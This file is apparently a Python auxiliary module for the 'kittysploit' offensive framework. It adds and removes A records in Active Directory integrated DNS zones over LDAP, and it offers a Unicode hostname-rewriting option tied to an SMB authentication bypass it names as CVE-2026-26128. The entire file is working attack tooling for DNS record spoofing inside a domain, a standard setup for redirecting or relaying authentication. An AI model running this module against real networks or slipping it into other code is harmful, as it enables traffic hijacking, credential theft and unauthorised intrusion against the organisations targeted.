#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import socket
import struct

from kittysploit import *
from lib.protocols.ldap.ad_client import Ad_client, LDAP3_AVAILABLE

try:
    from ldap3 import MODIFY_ADD, MODIFY_REPLACE
    from ldap3.utils.conv import escape_filter_chars
except ImportError:
    MODIFY_ADD = MODIFY_REPLACE = None
    escape_filter_chars = None


class Module(Auxiliary, Ad_client):

    __info__ = {
        "name": "Active Directory Integrated DNS record manager",
        "description": (
            "Add or remove A records in Active Directory integrated DNS zones via LDAP "
            "(ldap3 only). Supports Unicode hostname variants abused in CVE-2026-26128 "
            "(improper authentication in Windows SMB Server)."
        ),
        "author": ["KittySploit Team"],
        "tags": ["ad", "ldap", "dns", "idns", "auxiliary"],
    }

    dc_ip = OptString("", "Domain controller IP (defaults to target)", required=False)
    record_name = OptString("", "DNS record name or FQDN to manage", required=True)
    record_ip = OptString("", "IPv4 address for add action", required=False)
    action = OptChoice(
        "add",
        "Operation to perform",
        required=True,
        choices=["add", "remove"],
    )
    unicode_hostname = OptBool(
        False,
        "Apply CVE-2026-26128 Unicode normalization to the record label",
        required=False,
    )
    dns_zone = OptString("", "DNS zone (defaults to current AD domain)", required=False)
    use_forest_zone = OptBool(False, "Use ForestDnsZones instead of DomainDnsZones", required=False)
    allow_multiple = OptBool(False, "Allow multiple A records on the same name", required=False)

    _UNICODE_DOT = "\u2024"
    _CIRCLED_UPPER = 0x24B6
    _CIRCLED_LOWER = 0x24D0

    @classmethod
    def _unicode_hostname(cls, hostname: str) -> str:
        if not hostname:
            return hostname
        parts = hostname.split(".", 1)
        label = parts[0]
        zone = parts[1] if len(parts) > 1 else ""
        result = []
        letter_count = 0
        for char in label:
            if char.isalpha():
                letter_count += 1
                if letter_count == 2:
                    if char.isupper():
                        result.append(chr(cls._CIRCLED_UPPER + ord(char) - ord("A")))
                    else:
                        result.append(chr(cls._CIRCLED_LOWER + ord(char) - ord("a")))
                    continue
            result.append(char)
        converted = "".join(result)
        if zone:
            converted += cls._UNICODE_DOT + zone.replace(".", cls._UNICODE_DOT)
        return converted

    @staticmethod
    def _ldap_to_domain(ldap_dn: str) -> str:
        return re.sub(r",DC=", ".", ldap_dn[ldap_dn.find("DC=") :], flags=re.I)[3:]

    @staticmethod
    def _pack_dns_a_record(ip: str, serial: int = 1, ttl: int = 180) -> bytes:
        data = socket.inet_aton(ip)
        return (
            struct.pack("<HHBBH", len(data), 1, 5, 240, 0)
            + struct.pack("<L", serial)
            + struct.pack(">L", ttl)
            + struct.pack("<LL", 0, 0)
            + data
        )

    def _dns_root(self) -> str:
        if self.use_forest_zone:
            forest = ""
            if self._server and self._server.info:
                raw = self._server.info.raw.get("rootDomainNamingContext") or [b""]
                forest = raw[0].decode("utf-8", errors="ignore") if isinstance(raw[0], bytes) else str(raw[0])
            return f"CN=MicrosoftDNS,DC=ForestDnsZones,{forest}" if forest else ""
        return f"CN=MicrosoftDNS,DC=DomainDnsZones,{self.base_dn}"

    def _resolve_record_target(self, record_name: str, zone: str) -> tuple:
        name = str(record_name or "").strip()
        zone_name = str(zone or "").strip() or self._ldap_to_domain(self.base_dn)
        if name.lower().endswith(zone_name.lower()):
            name = name[: -(len(zone_name) + 1)]
        if self.unicode_hostname:
            if "." in name:
                left, right = name.split(".", 1)
                name = self._unicode_hostname(f"{left}.{right}")
            else:
                name = self._unicode_hostname(name)
        return name, zone_name

    def _find_dns_node(self, conn, node_name: str, zone_name: str):
        search_base = f"DC={zone_name},{self._dns_root()}"
        safe_name = escape_filter_chars(node_name) if escape_filter_chars else node_name
        conn.search(
            search_base,
            f"(&(objectClass=dnsNode)(name={safe_name}))",
            attributes=["dnsRecord", "dNSTombstoned", "name"],
        )
        for entry in conn.entries:
            return entry
        return None

    def add_record(self, record_name: str, record_ip: str) -> bool:
        if not LDAP3_AVAILABLE or not self.conn:
            print_error("ldap3 is required and LDAP bind failed")
            return False

        node_name, zone_name = self._resolve_record_target(record_name, self.dns_zone)
        record_bytes = self._pack_dns_a_record(record_ip)
        conn = self.conn
        entry = self._find_dns_node(conn, node_name, zone_name)
        search_base = f"DC={zone_name},{self._dns_root()}"

        if entry:
            if not self.allow_multiple:
                print_error("DNS node already exists; set ALLOW_MULTIPLE or use remove first")
                return False
            ok = conn.modify(entry.entry_dn, {"dnsRecord": [(MODIFY_ADD, record_bytes)]})
        else:
            schema = ""
            if self._server and self._server.info:
                raw = self._server.info.raw.get("schemaNamingContext") or [b""]
                schema = raw[0].decode("utf-8", errors="ignore") if isinstance(raw[0], bytes) else str(raw[0])
            node_dn = f"DC={node_name},{search_base}"
            ok = conn.add(
                node_dn,
                ["top", "dnsNode"],
                {
                    "objectCategory": f"CN=Dns-Node,{schema}",
                    "dNSTombstoned": False,
                    "name": node_name,
                    "dnsRecord": [record_bytes],
                },
            )

        if ok:
            print_success(f"Added A record {node_name}.{zone_name} -> {record_ip}")
            return True

        print_error(f"LDAP add failed: {conn.result}")
        return False

    def remove_record(self, record_name: str) -> bool:
        if not LDAP3_AVAILABLE or not self.conn:
            print_error("ldap3 is required and LDAP bind failed")
            return False

        node_name, zone_name = self._resolve_record_target(record_name, self.dns_zone)
        entry = self._find_dns_node(self.conn, node_name, zone_name)
        if not entry:
            print_error("DNS node not found")
            return False

        tombstone = self._pack_dns_a_record("0.0.0.0", serial=0, ttl=0)
        ok = self.conn.modify(
            entry.entry_dn,
            {
                "dnsRecord": [(MODIFY_REPLACE, [tombstone])],
                "dNSTombstoned": [(MODIFY_REPLACE, [True])],
            },
        )
        if ok:
            print_success(f"Marked DNS record {node_name}.{zone_name} for tombstone cleanup")
            return True

        print_error(f"LDAP remove failed: {self.conn.result}")
        return False

    def run(self):
        if not LDAP3_AVAILABLE:
            print_error("ldap3 is not installed")
            return False

        if str(self.dc_ip or "").strip():
            self.target = str(self.dc_ip).strip()

        if not self.conn:
            print_error("LDAP bind failed; check target, credentials, and LDAP signing requirements")
            return False

        action = str(self.action or "add").strip().lower()
        record = str(self.record_name or "").strip()
        if not record:
            print_error("RECORD_NAME is required")
            return False

        if action == "add":
            ip = str(self.record_ip or "").strip()
            if not ip:
                print_error("RECORD_IP is required for add")
                return False
            return self.add_record(record, ip)

        return self.remove_record(record)
